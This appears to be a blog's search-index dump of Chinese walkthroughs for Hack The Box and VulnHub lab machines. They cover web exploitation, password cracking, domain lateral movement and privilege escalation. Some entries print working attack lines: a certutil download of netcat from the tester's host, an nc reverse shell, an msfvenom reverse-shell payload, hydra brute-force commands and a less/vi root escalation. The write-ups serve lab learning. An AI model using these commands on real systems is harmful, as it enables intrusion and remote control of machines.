\u0026ndash;\u0026gt;发现是C盘\u0026ndash;\u0026gt;导出SAM和SYSTEM文件\u0026ndash;\u0026gt;读取hash\u0026ndash;\u0026gt;破解\u0026ndash;\u0026gt;提权\u003c/p\u003e\n\u003cp\u003e提权无法直接通过脚本提示，需要查找软件目录，发现非常规软件mRemoteNG\u0026mdash;\u0026gt;信息查找，发现该软件可能存在密码读取的情况\u0026ndash;\u0026gt;漏洞利用，提取administrator密码成功\u003c/p\u003e\n\u003cp\u003e考点：VHD硬盘备份、sam文件读取、mRemoteNG密码提取；知识点盲区是本靶场的核心问题。\u003c/p\u003e\n\u003ch1 id=\"0x005blue-简单-非域\"\u003e0x005：Blue 简单 非域\u003c/h1\u003e\n\u003cp\u003e渗透思路：nmap告诉存在ms17-010\u0026ndash;\u0026gt;需要了解python如何实现ms17-010\u003c/p\u003e\n\u003cp\u003e考点：在不依赖msf的情况下，如何打ms17-010\u003c/p\u003e\n\u003ch1 id=\"0x006bounty-简单-非域\"\u003e0x006：Bounty 简单 非域\u003c/h1\u003e\n\u003cp\u003e渗透思路：目录扫描发现上传功能\u0026ndash;\u0026gt;但是无法上传正常的后缀\u0026ndash;\u0026gt;通过fuzz发现可上传.config后缀\u0026ndash;\u0026gt;该后缀在II7.0以上可以getshell\u0026ndash;\u0026gt;提权ms16-032\u003c/p\u003e\n\u003cp\u003e考点：config getshell\u003c/p\u003e\n\u003ch1 id=\"0x007acute-困难-域渗透非常规打法\"\u003e0x007：Acute 困难 域渗透（非常规打法）\u003c/h1\u003e\n\u003cp\u003e端口扫描：\u003c/p\u003e\n\u003cp\u003e发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。\u003c/p\u003e\n\u003cp\u003eweb渗透：\u003c/p\u003e\n\u003cp\u003e首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及Lois用户是网站管理员等信息；通过泄露的员工名，拼接首字母和后面的名，使用默认密码，成功撞库PSWA，获取立足点powershell，普通权限，用户名：acute\\edavies。\u003c/p\u003e\n\u003cp\u003e后渗透阶段：\u003c/p\u003e\n\u003cp\u003e这台靶机目前最好还是使用meterpreter，完全避免使用meterpreter的话，会花费巨量时间，以及部分功能可能无法通过脚本实现。\u003c/p\u003e\n\u003cp\u003e后渗透-横向移动阶段1：\u003c/p\u003e\n\u003cp\u003e通过查看当前的远程登录会话，可以发现目前的用户acute\\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\\imonks用户没有权限进入。\u003c/p\u003e\n\u003cp\u003e后渗透-横向移动阶段2：\u003c/p\u003e\n\u003cp\u003e在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。\u003c/p\u003e\n\u003cp\u003e后渗透-横向移动阶段3：\u003c/p\u003e\n\u003cp\u003e使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。\u003c/p\u003e\n\u003cp\u003e后渗透-横向移动阶段4：\u003c/p\u003e\n\u003cp\u003eawallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为Lois，该用户是最开始告诉我们的网站管理员，同时在域内查找用户组，可以发现，site_admin用户组，该用户组属于domain admin group用户组，也就是说这个计划任务可以让我们获得域管理员组权限，利用这个BAT提权成功，即可获得ATSSERVER主机的管理员权限，拿到最终的flag.\u003c/p\u003e\n\u003cp\u003e考点：1、信息收集；2、pswa；3、powershell熟练度；4、内网信息收集，密码获取；5、计划任务提权\u003c/p\u003e\n\u003cp\u003e放在最后：这个靶机的打法及其非常规，最开始的信息收集便在一直挑战打靶者的思路完善程度，内网的提权和信息收集过程，更是把两个机器当成一个整体的思维在进行渗透，信息收集的程度堪称离谱，powershell的熟悉程度也是一个不小的挑战，最后的来回横跳巨爽。\u003c/p\u003e\n\u003ch1 id=\"0x008timelapse-简单-域渗透\"\u003e0x008：Timelapse 简单 域渗透\u003c/h1\u003e\n\u003cp\u003e渗透思路：\nsmb匿名访问\u0026ndash;\u0026gt;zip文件\u0026ndash;\u0026gt;破解发现pfx文件\u0026ndash;\u0026gt;再次破解\u0026ndash;\u0026gt;提取出私钥和公钥\u0026ndash;\u0026gt;wirm登录\u0026ndash;\u0026gt;提权，通过查看powershell历史记录，发现账号密码\u0026ndash;\u0026gt;发现该账号具有laps_readers组权限，可以读取administraor密码\u003c/p\u003e\n\u003cp\u003e考点：1、PFX；2、laps_readers\u003c/p\u003e\n\u003ch1 id=\"0x009streamio-中等-域渗透\"\u003e0x009：StreamIO 中等 域渗透\u003c/h1\u003e\n\u003cp\u003e渗透思路：\nweb渗透\u0026ndash;\u0026gt;注意证书的域名变化\u0026ndash;\u0026gt;再次目录扫描\u0026ndash;\u0026gt;发现sql注入\u0026ndash;\u0026gt;获取网站的用户名和密码\u0026ndash;\u0026gt;通过burp爆破，成功获取到合法用户\u0026ndash;\u0026gt;进入后台，注意url存在?\u0026ndash;\u0026gt;fuzz发现debug参数\u0026ndash;\u0026gt;是个文件包含，需要使用base64带出\u0026ndash;\u0026gt;这里的思路有点非常规，爆破当前目录，发现master.php，读取它\u0026ndash;\u0026gt;发现它接收post提交的参数，并执行\u0026ndash;\u0026gt;通过文件包含，并携带参数，命令执行反弹shell\u0026ndash;\u0026gt;读取数据库账号密码\u0026ndash;\u0026gt;winrm登录\u0026ndash;\u0026gt;读取浏览器密码\u0026ndash;\u0026gt;获取到JDgodd用户权限\u0026ndash;\u0026gt;修改CORE STAFF组的拥有者为JDgodd，把自己添加到组内，并修改dacl，读取密码\u003c/p\u003e","title":"0X000 HTB windows靶机总结"},{"content":"个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x000-%E5%89%8D%E8%A8%80/","summary":"\u003cp\u003e个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。\u003c/p\u003e","title":"0x000 前言"},{"content":"端口扫描： 获取立足点 版本是7.54：\n判断一下，基本能用的就这些：\n第一个遇到需要寻找一个端点，来进行渗透测试：\n通过gobuster发现node：\n对该目录接着进行扫描，发现01：\n访问一下：\n点击：\n把rest和rest_endpoint输入进去：\n执行成功：\n替换代码：\n执行：\n上传nc:\nhttp://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\\Windows\\Temp\\b.exe\n反弹shell:\nstart C:\\Windows\\Temp\\b.exe -e cmd.exe 10.10.16.4 9999\n用第二个rb的脚本也是可以的：\n提权 ipconfig:\nuser.txt:\n运行我们的脚本：\nhttps://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9\nwinpeass\n其实也得看一下这些里面哪些是常用的，和有EXP的：\nhttps://github.com/abatchy17/WindowsExploits\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051\n这里选一个，用得比较多的：\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools\n：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x001-bastard/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描：\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb3d7a7acb7f5875803b8d77d07427b3eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE47f3572f4d6819bed9f11b147ff33718image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch2 id=\"获取立足点\"\u003e获取立足点\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0adc3946b4962d062d144b04c4b91882image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4771da8485050d5158dfe97c2d6a81dcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e版本是7.54：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEacfa99ca7197578961cf197a69b65897image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e判断一下，基本能用的就这些：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd9ef537a0ef532d40abd2a39e7d78db3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e第一个遇到需要寻找一个端点，来进行渗透测试：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE361f32b7cee278d6e2397924972769e7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过gobuster发现node：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2d914653c97c19b2474e340f7c0ee87eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e对该目录接着进行扫描，发现01：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE060b2eecf0df2aa12ed8723373928449image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e访问一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE75bad0944eda4e2d29aea5db9b89368bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e点击：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE204736d39eca3b90bbe5da6e8ca0cac3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把rest和rest_endpoint输入进去：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEde39c6c08041508ae9b3c72f521ba4e8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e执行成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4b89a0370927b80ba773bb5027f6b820image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e替换代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1272b51816c79b770e4d253ff22071b8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e执行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE34510262979338e66fe15a8a177eb07bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上传nc:\u003c/p\u003e\n\u003cp\u003ehttp://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\\Windows\\Temp\\b.exe\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb8ea0f9ba79c3e54cba1450d84b8f819image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell:\u003c/p\u003e\n\u003cp\u003estart C:\\Windows\\Temp\\b.exe -e cmd.exe 10.10.16.4 9999\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe858889d3ce85b26fab611d93873b3adimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用第二个rb的脚本也是可以的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE54d3e3046eaf9f5cabaa77e51418c19cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE42d10c5ffacaba987b93e0f00f09e691image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE71fa67f3fe83b1240de15a3f64eccc75image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eipconfig:\u003c/p\u003e","title":"0X001 Bastard"},{"content":"IP发现\u0026amp;端口扫描 sudo nmap -Pn -sS -p- --min-rate 10000 192.168.154.0/24 sudo nmap -Pn -sV -p 80,111,777,42557 --min-rate 10000 192.168.154.129 目录扫描 gobuster dir -u http://192.168.154.129/ -w /usr/share/wordlists/dirb/common.txt 发现隐藏信息的图片，有路径 命令：exiftool main.gif 根据提示进行爆破，hydra http 爆破 示例：\n解释表单参数，“路径:用户名:密码:F=错误返回”\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid\u0026#34; -t 64 抓包看提交参数，这里经过摸索，使用-e n 参数来只爆破用户名\n完整命令如下：\nhydra -L /usr/share/wordlists/rockyou.txt -e n 192.168.154.129 http-post-form \u0026#34;/kzMb5nVYJw/index.php:key=^USER^:F=invalid\u0026#34; -t 60 获得账号：elite\nSQL注入 破解hash，Base64解码一下 翻查敏感信息 修复文件?\n数据库密码登录失败：\n修复方式不清楚，看了WP，history内有提示：\n运行：\n提权 ln -s /bin/sh ps\rexport PATH=.:$PATH flag:adf11c7a9e6523e630aaf3b9b7acb51d\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x001-nullbyte-1/","summary":"\u003ch1 id=\"ip发现端口扫描\"\u003eIP发现\u0026amp;端口扫描\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo nmap -Pn -sS -p- --min-rate 10000 192.168.154.0/24\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE51a6e0215fb9c3cebfcf5ca850a3aabd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo nmap -Pn -sV -p 80,111,777,42557 --min-rate 10000 192.168.154.129\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1440a52bba0d13119375a35bb5d91007%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"目录扫描\"\u003e目录扫描\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egobuster dir -u http://192.168.154.129/ -w /usr/share/wordlists/dirb/common.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1eb9f90b824cdd50b178a4e85082979%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"发现隐藏信息的图片有路径\"\u003e发现隐藏信息的图片，有路径\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e命令：exiftool main.gif\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"根据提示进行爆破hydra-http-爆破\"\u003e根据提示进行爆破，hydra http 爆破\u003c/h1\u003e\n\u003cp\u003e示例：\u003c/p\u003e\n\u003cp\u003e解释表单参数，“路径:用户名:密码:F=错误返回”\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-text\" data-lang=\"text\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid\u0026#34; -t 64\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e抓包看提交参数，这里经过摸索，使用-e n 参数来只爆破用户名\u003c/p\u003e\n\u003cp\u003e完整命令如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehydra -L /usr/share/wordlists/rockyou.txt -e n 192.168.154.129 http-post-form \u0026#34;/kzMb5nVYJw/index.php:key=^USER^:F=invalid\u0026#34; -t 60\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e获得账号：elite\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE685e129e46e63fad64e61d8f8010a2a2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"sql注入\"\u003eSQL注入\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcbc84a3ac2d9f43525d3ace151bdd022%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"破解hashbase64解码一下\"\u003e破解hash，Base64解码一下\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa7afcc6b8b1e2bda6028950386326cd4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"翻查敏感信息\"\u003e翻查敏感信息\u003c/h1\u003e\n\u003cp\u003e修复文件?\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE98de53f7ca8b73524c3345126a406676%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x001 NullByte 1"},{"content":"端口扫描 获取立足点 端口扫描没有发现什么东西，使用浏览器看看：\n在8500端口发现目录：\n多点几个，就可以发现一个登录页面：\n简单修改一下：\ngetshell:\nuser.txt\n提权 脚本跑一半卡住了：\n暂且试试这个吧：\n找了很多地方，最后在github找到了这个：\nhttps://github.com/zcgonvh/MS16-032/releases/tag/Release\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x002-arctic/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf6d72da494f38de5fed08804d34a61c3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE833aee3fd7f537d2c3b8a04e9f154944image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE53d7733878f164ca14703d16760544e1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e端口扫描没有发现什么东西，使用浏览器看看：\u003c/p\u003e\n\u003cp\u003e在8500端口发现目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE41b83d461cb7a5a03146d8fa1eb8d1afimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e多点几个，就可以发现一个登录页面：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2541ac8fbc25bd846fc4973eb39cb6f4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE94bcf131227a9d45707970a4b861a941image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e简单修改一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE89c15fee79f0f23d1e5d9b727b13a407image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003egetshell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE53d6caae5bd8100a6f39643b67ab2aadimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003euser.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb942387a31d460081eefbb1455493548image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE218a61c3eda589112c633a28f358c0a6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfb0873c52764bdcd00533bb59327ba5aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e脚本跑一半卡住了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5c4e536796440628e46856af9c8fd32bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e暂且试试这个吧：\u003c/p\u003e\n\u003cp\u003e找了很多地方，最后在github找到了这个：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/zcgonvh/MS16-032/releases/tag/Release\"\u003ehttps://github.com/zcgonvh/MS16-032/releases/tag/Release\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEeb78205aafb5cd8aa28bdf152bbbd822image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3bf028759e5e97dc57898d9c1a8f18ceimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEce39594a2e63d6e20c40de5570dba99eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X002 Arctic"},{"content":"IP\u0026amp;端口扫描 sudo nmap -Pn -sS -p- -sV 192.168.154.130 挂载NFS sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage 破解解压密码 7z2john backup.7z \u0026gt; hash3\rjohn -wordlist=/usr/share/wordlists/rockyou.txt hash3 发现图片和私钥 图片内没有东西，私钥链接需要密码：\n破解rsa私钥密码 方式与上面一致\n提权 SUID提权：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null 查找命令相关文件：\nfind / -name *doas* -type f 2\u0026gt;/dev/null 根据提示来看，使用以下命令：\ndoas /usr/bin/less /var/log/authlog 然后按V来使用VI编辑器，然后输入：！sh来获得root shell\n总结 用doas的高权限运行/usr/bin/less查看/var/log/authlog，然后调用VI编辑器，通过VI编辑器可以获得高权限sh shell。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x002-fourandsix2.01/","summary":"\u003ch1 id=\"ip端口扫描\"\u003eIP\u0026amp;端口扫描\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo nmap -Pn -sS -p- -sV  192.168.154.130\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45460ef9fe8d8f4de9fccc017dd36244%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"挂载nfs\"\u003e挂载NFS\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo mount -t nfs 192.168.154.130:/home/user/storage ./storage\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"破解解压密码\"\u003e破解解压密码\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e7z2john backup.7z \u0026gt; hash3\r\njohn -wordlist=/usr/share/wordlists/rockyou.txt hash3\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"发现图片和私钥\"\u003e发现图片和私钥\u003c/h1\u003e\n\u003cp\u003e图片内没有东西，私钥链接需要密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb78f860910caa1eafc7b0f4a9b55bff5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"破解rsa私钥密码\"\u003e破解rsa私钥密码\u003c/h1\u003e\n\u003cp\u003e方式与上面一致\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38b881339b33a84247dd712004ba787e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003eSUID提权：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efind / -perm -u=s -type f 2\u0026gt;/dev/null\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3897cdce7c776f8933a5f679f20638de%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查找命令相关文件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efind / -name *doas* -type f 2\u0026gt;/dev/null\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfaa371dfa93e8d3cbfb15e92deab123d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e根据提示来看，使用以下命令：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edoas /usr/bin/less /var/log/authlog\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后按V来使用VI编辑器，然后输入：！sh来获得root shell\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1a69288e2eed33e3a2ca48eb14b0a473%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e用doas的高权限运行/usr/bin/less查看/var/log/authlog，然后调用VI编辑器，通过VI编辑器可以获得高权限sh shell。\u003c/p\u003e","title":"0x002 FourAndSix2.01"},{"content":"端口扫描 获取立足点 ftp匿名登录:\nHTTP配合：\n生成木马：\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f aspx -o cxk.aspx\n提权 没有任何补丁：\n内核提权试试：\n上传32位的nc:\nhttps://github.com/int0x33/nc.exe/blob/master/nc.exe\n6988a0c5429f9c38b48a927333d8701a\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x003-devel/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8fa170ba37f4fdeeebab2d8169336c34image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE77147834dff16d0532bf298f0ff45314image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE20d52032feda99b423deb2fa93ae93a2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003eftp匿名登录:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdda843ba7d07b35e6a5190d2007b8a8bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eHTTP配合：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4585ba8026fe26a06f7f20ad79925988image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e生成木马：\u003c/p\u003e\n\u003cp\u003emsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f aspx -o cxk.aspx\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE93b9d30a443c1afadfd86c98d81e9888image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa5950510bcf11e167cd7053203227b51image.png\" alt=\"\"  